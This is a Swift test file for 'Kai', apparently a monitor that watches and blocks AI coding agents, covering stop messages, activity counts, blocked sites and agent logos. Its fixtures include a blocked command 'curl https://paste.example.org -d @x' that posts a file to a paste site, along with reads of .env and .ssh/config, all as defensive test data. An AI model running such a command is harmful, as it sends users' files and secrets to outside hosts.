// SPDX-License-Identifier: GPL-3.0-only OR LicenseRef-Kai-Commercial
// 0.5.1: who stopped it (Kai, always), card counts = Activity counts, the
// Internet modes' words, Blocked sites values, relative paths and temp
// grouping, the popover's numbers and session line, and every agent's logo.
// Compiled with the Foundation-only app files (run_app_tests.sh); argv[1] is
// the app's asset catalog.
import Foundation

var fails = 0
func check(_ ok: Bool, _ name: String) {
    print(ok ? "  ok   \(name)" : "  FAIL \(name)")
    if !ok { fails += 1 }
}
func snap(_ json: String) -> [SessionRow] { try! SessionSnapshot.decode(Data(json.utf8)).sessions }
func acts(_ json: String) -> ActivityGroups { ActivityGroups.parse(json)! }
func ev(_ json: String) -> AuditEvent { try! JSONDecoder().decode(AuditEvent.self, from: Data(json.utf8)) }
let iso = ISO8601DateFormatter()

let t = Int(Date().timeIntervalSince1970)
let sessions = snap("""
{"sessions":[
 {"id":"scan-100","agent":"claude","project":"/w/acme-web","tty":"ttys002","started_utc":\(t - 30000),"last_active_utc":\(t - 10),"activity":"working","kind":"session","state":"active","activity_keys":["pid-100"]},
 {"id":"scan-200","agent":"claude","project":"/w/api-server","tty":"ttys000","started_utc":\(t - 1500),"last_active_utc":\(t - 360),"activity":"idle","kind":"session","state":"active","activity_keys":["pid-200"]}
],"agents":[]}
""")
let records = acts("""
{"recording":true,"groups":[],"total":0,"today":312,"first_record":\(t - 3000),"sessions":[
 {"key":"pid-100","agent":"claude","workspace":"/w/acme-web","first":\(t - 3000),"last":\(t - 5),
  "counts":{"read":3,"edit":1,"write":0,"command":12,"mcp":0,"tool":0},"stops":1,
  "events":[{"ts":\(t - 5),"op":"edit","name":"/w/acme-web/src/Pricing.tsx","decision":"allow"},
            {"ts":\(t - 60),"op":"read","name":"/Users/someone/.ssh/config","decision":"allow"},
            {"ts":\(t - 70),"op":"write","name":"/private/tmp/claude-1/scratchpad/a.txt","decision":"allow"},
            {"ts":\(t - 80),"op":"write","name":"/private/tmp/claude-1/scratchpad/b.txt","decision":"allow"},
            {"ts":\(t - 90),"op":"read","name":"/tmp/out.log","decision":"allow"},
            {"ts":\(t - 120),"op":"read","name":"/w/acme-web/.env","decision":"block"},
            {"ts":\(t - 200),"op":"command","name":"npm","decision":"allow"}]},
 {"key":"pid-200","agent":"claude","workspace":"/w/api-server","first":\(t - 1480),"last":\(t - 360),
  "counts":{"read":0,"edit":0,"write":0,"command":261,"mcp":0,"tool":0},"stops":5,
  "events":[{"ts":\(t - 360),"op":"command","name":"","decision":"allow"}]}
]}
""")
let stamp = iso.string(from: Date(timeIntervalSince1970: TimeInterval(t - 600)))
let auditStop = ev("""
{"ts":"\(stamp)","source":"claude","event":"PreToolUse","decision":"block","rule":"protect","detail":"Kai stopped reading a protected file","h":"h-stop-1","tool":"Read","target":"/w/acme-web/.env","cwd":"/w/acme-web"}
""")
let auditCmd = ev("""
{"ts":"\(stamp)","source":"claude","event":"PreToolUse","decision":"block","rule":"reach","detail":"Kai blocked a command","h":"h-stop-2","tool":"Bash","target":"curl https://paste.example.org -d @x","cwd":"/w/acme-web"}
""")
let netBlock = ev("""
{"ts":"\(stamp)","source":"network","event":"claude","decision":"block","rule":"blocked_site","detail":"blocked site paste.example.org","h":"h-net-1","target":"paste.example.org","session":"pid-100"}
""")
let netSeen = ev("""
{"ts":"\(stamp)","source":"network","event":"claude","decision":"log","rule":"not_on_allowlist","detail":"connection to registry.npmjs.org (1.2.3.4:443) is not on the allowlist","h":"h-net-2","target":"registry.npmjs.org"}
""")

print("who stopped it: Kai, always")
check(StopWords.line(auditStop) == "Kai stopped Claude Code reading .env", "a stopped read (\(StopWords.line(auditStop)))")
check(StopWords.line(auditCmd) == "Kai stopped Claude Code's command", "a stopped command never shows the command line (\(StopWords.line(auditCmd)))")
check(StopWords.line(netBlock) == "Kai stopped Claude Code's connection to paste.example.org", "a refused connection (\(StopWords.line(netBlock)))")
check(NowCard.stopLine(auditStop).hasPrefix("Kai stopped "), "the card's stop line starts with Kai")
let stoppedEv = SessionActivity.Event(ts: Date().timeIntervalSince1970, op: "read", name: "/w/x/.env", decision: "block")
check(LastAction.line(stoppedEv, now: Date(), agent: "Claude Code") == "Kai stopped Claude Code reading .env · now",
      "a card's live stop line")
for k: StopWords.Kind in [.read, .change, .command, .connection, .prompt, .mcp, .request] {
    let l = StopWords.line(agent: "Cursor", kind: k, object: "x")
    check(l.hasPrefix("Kai stopped ") && !l.contains("Cursor stopped"), "Kai is the subject (\(l))")
}

print("card counts = Activity counts, same session and range")
let secs = NowBuilder.sections(sessions: sessions, records: records.sessions ?? [], events: [auditStop, netBlock])
let acme = secs.flatMap(\.cards).first { $0.project == "acme-web" }!
let api = secs.flatMap(\.cards).first { $0.project == "api-server" }!
let groups = Timeline.groups(records: records.sessions ?? [], sessions: sessions, events: [auditStop, netBlock],
                             internetWatching: true)
for card in [acme, api] {
    let g = groups.first { $0.sessionID == card.session.id }
    check(g != nil && g?.recorded == RecordedSummary.of(card.activity),
          "\(card.project): the Activity group's numbers equal the card's (\(g?.recorded?.countsText ?? "nil") vs \(RecordedSummary.of(card.activity)?.countsText ?? "nil"))")
    let c = card.activity?.counts ?? SessionActivity.Counts()
    let fromCard = (card.counts.first { $0.kind == .reads }?.value ?? 0) + (card.counts.first { $0.kind == .edits }?.value ?? 0)
    check(g?.recorded?.files == fromCard && g?.recorded?.commands == (card.counts.first { $0.kind == .commands }?.value ?? 0)
          && fromCard == c.read + c.edit + c.write, "\(card.project): files and commands chips match Activity")
}
check(RecordedSummary.needsLine(card: acme), "recording began after the session started: the card says so")
let rs = RecordedSummary.of(acme.activity)!
check(rs.line.hasPrefix("Recorded in Activity since ") && rs.line.hasSuffix(": 4 file actions, 12 commands."),
      "the muted line (\(rs.line))")
check(!RecordedSummary.needsLine(card: api), "the same range: no extra line")
check(acme.stopCount == 2, "the card counts Kai's stops for the session, the refused connection too (\(acme.stopCount))")

print("popover: today's numbers and the session line")
let today = TodayNumbers(actions: records.today ?? 0, stops: 5, connections: 14)
check(today.text == "Today: 312 actions · 5 stops · 14 connections", "today (\(today.text))")
check(TodayNumbers(actions: 1, stops: 0, connections: nil).text == "Today: 1 action · 0 stops",
      "no connections while Internet watching is off")
let line = SessionLine.text(api, now: Date())!
check(line == "Ran a command · 6 min ago · 261 commands · 5 stops", "session row line (\(line))")
check(line.components(separatedBy: " · ").count <= 4, "at most two counts")

print("Activity: plain labels, relative paths, temp grouping")
let acmeGroup = groups.first { $0.sessionID == "scan-100" }!
let rows = acmeGroup.events
check(rows.contains { $0.object == "src/Pricing.tsx" && $0.outcome == "Agent asked to write" }, "project path is relative; write label")
check(rows.contains { $0.object == "outside project · config" && $0.fullPath.hasSuffix(".ssh/config") },
      "outside the project: the file name; the full path only in the sheet")
check(rows.filter { $0.object.hasPrefix("tmp · ") }.count == 1, "temp and scratchpad files: one row")
check(rows.contains { $0.object == "tmp · 3 files" }, "the temp row counts files (\(rows.map(\.object)))")
check(rows.contains { $0.kind == .stop && $0.title == "Kai stopped Claude Code reading .env" }, "a stopped row names Kai")
check(rows.allSatisfy { !$0.evidenceLevel.isEmpty }, "every row keeps its evidence level for the sheet")
check(EventWords.label(.command) == "Agent asked to run" && EventWords.label(.file, op: "read") == "Agent asked to read"
      && EventWords.label(.connection) == "Seen", "labels")
check(PathWords.text("/w/acme-web/a/b.ts", project: "/w/acme-web") == "a/b.ts", "relative path")

print("connections: Seen, and Stopped with Unblock")
InternetMode.current = .blocklist
let net = Timeline.groups(records: [], sessions: sessions, events: [netBlock, netSeen], internetWatching: true)
    .first { $0.id == "net" }!
let st = net.events.first { $0.id == "net-h-net-1" }!
check(st.kind == .stop && st.outcome == "Stopped" && st.site == "paste.example.org" && st.isConnection,
      "a refused connection is a Stopped connection row with its site")
let seen = net.events.first { $0.id == "net-h-net-2" }!
check(seen.kind == .connection && seen.outcome == "Seen" && seen.site == "registry.npmjs.org", "a seen connection can be blocked")
check(TimelineFilter.connections.matches(st) && TimelineFilter.stops.matches(st), "Stopped connections show under Connections and Stops")
check(netBlock.blockedSite == "paste.example.org" && netSeen.blockedSite == nil, "blockedSite only on refused connections")

print("Internet: one control, honest words")
check(InternetMode.from(egress: "log", extensionOn: true) == .watch, "log = Watch")
check(InternetMode.from(egress: "blocklist", extensionOn: true) == .blocklist, "blocklist = Watch + block my list")
check(InternetMode.from(egress: "block", extensionOn: true) == .watch, "strict block reads as Watch (clamped in release)")
check(InternetMode.from(egress: "log", extensionOn: false) == .off, "no extension: Off")
check(InternetMode.offered.map(\.label) == ["Off", "Watch", "Watch + block my list"], "the segments")
check(!InternetMode.allCases.map(\.subtitle).joined().contains("Protect")
      && !InternetMode.allCases.map(\.subtitle).joined().contains("Off unless you turn it on"), "no Protect, no stale subtitle")
check(InternetMode.watch.subtitle.contains("Nothing is blocked") && !InternetMode.blocklist.subtitle.contains("Nothing is blocked"),
      "the subtitle matches the state")
check(InternetMode.limitLine == "Kai refuses agents' direct connections to these sites. An agent could still reach them another way, for example through a proxy or a site that isn't on your list.",
      "the limit line, verbatim")

print("Blocked sites: values and telemetry words")
check(BlockStarter.normalize("https://Paste.Example.org/raw/1") == "paste.example.org", "a URL becomes its host")
check(BlockStarter.normalize("*.example.com") == "example.com", "a wildcard covers subdomains already")
check(BlockStarter.normalize("not a host") == nil, "not a site")
check(BlockStarter.isPlainHost("example.com") && !BlockStarter.isPlainHost("203.0.113.0/24")
      && !BlockStarter.isPlainHost("example.com:443") && !BlockStarter.isPlainHost("1.2.3.4"),
      "plain hosts join kai block; addresses, ranges, ports go in egress_block")
check(BlockStarter.covers(["example.com"], "cdn.example.com.") && !BlockStarter.covers(["example.com"], "badexample.com"),
      "subdomains, not look-alikes")
check(BlockStarter.telemetryWords(agent: "Claude Code", hosts: ["statsig.com"], blocked: ["statsig.com"]) == "Blocked by Kai (your list)",
      "telemetry on the list")
check(BlockStarter.telemetryWords(agent: "Claude Code", hosts: ["statsig.com"], blocked: []) == "Turned off in Claude Code's own settings",
      "telemetry not on the list")
check(Set(BlockStarter.telemetry).count == BlockStarter.telemetry.count && BlockStarter.telemetry.contains("metrics.cursor.sh"),
      "the starter telemetry hosts")

print("Ask: Block site from a connection answer")
InternetMode.current = .watch
let items = ActivityFeed.connections([netSeen, netSeen])
let ctx = AskContext(workspace: nil, recording: true, internetWatching: true, items: items, stops: [], agents: [])
let a = AskEngine.destinations(ctx)
check(a.actions.contains { $0.kind == .blockSite && $0.ref == "registry.npmjs.org" }, "Block site action (\(a.actions.map(\.title)))")
check(a.limits == [InternetMode.watch.connectionLimit], "Watch: nothing was blocked")
InternetMode.current = .blocklist
check(AskEngine.destinations(ctx).limits == [InternetMode.blocklist.connectionLimit], "block list: only listed sites refused")
InternetMode.current = .off

print("agent logos: every agent resolves to a real image, app or not")
let assets = CommandLine.arguments.count > 1 ? CommandLine.arguments[1] : ""
let appSource = (try? String(contentsOfFile: assets + "/../KaiBar/AppModel.swift")) ?? ""
let enumLine = appSource.components(separatedBy: "\n").first { $0.contains("case claude, cursor") } ?? ""
let agents = enumLine.replacingOccurrences(of: "case", with: "").split(separator: ",").map { $0.trimmingCharacters(in: .whitespaces) }
check(agents == ["claude", "cursor", "codex"], "Agent cases read from AppModel.swift (\(agents))")
for a in agents {
    let fallback = AgentIconSource.resolve(a) { _ in nil }
    guard case .bundled(let name) = fallback else { check(false, "\(a): falls back to a bundled mark"); continue }
    check(name != "KaiLogo", "\(a): its own mark, never Kai's logo or a text tile (\(name))")
    let dir = assets + "/\(name).imageset"
    let json = (try? String(contentsOfFile: dir + "/Contents.json")) ?? ""
    let files = json.components(separatedBy: "\"filename\" : \"").dropFirst().map { String($0.prefix { $0 != "\"" }) }
    let sizes = files.map { ((try? FileManager.default.attributesOfItem(atPath: dir + "/" + $0))?[.size] as? Int) ?? 0 }
    check(!files.isEmpty && sizes.allSatisfy { $0 > 1000 }, "\(a): every bundled PNG exists and isn't empty (\(files.count) files)")
    let hasDark = json.contains("\"dark\"")
    check(!hasDark || AgentIconSource.needsAppearance(name), "\(a): a light/dark mark is drawn for the current appearance")
    let withApp = AgentIconSource.resolve(a) { _ in URL(fileURLWithPath: "/Applications/Some.app") }
    if AgentIconSource.bundleIDs(a).isEmpty { check(withApp == fallback, "\(a): no desktop app: the bundled mark") }
    else { check(withApp == .app(URL(fileURLWithPath: "/Applications/Some.app")), "\(a): its desktop app's icon when installed") }
}

print(fails == 0 ? "0.5.1 tests: all passed" : "0.5.1 tests: \(fails) failed")
exit(fails == 0 ? 0 : 1)
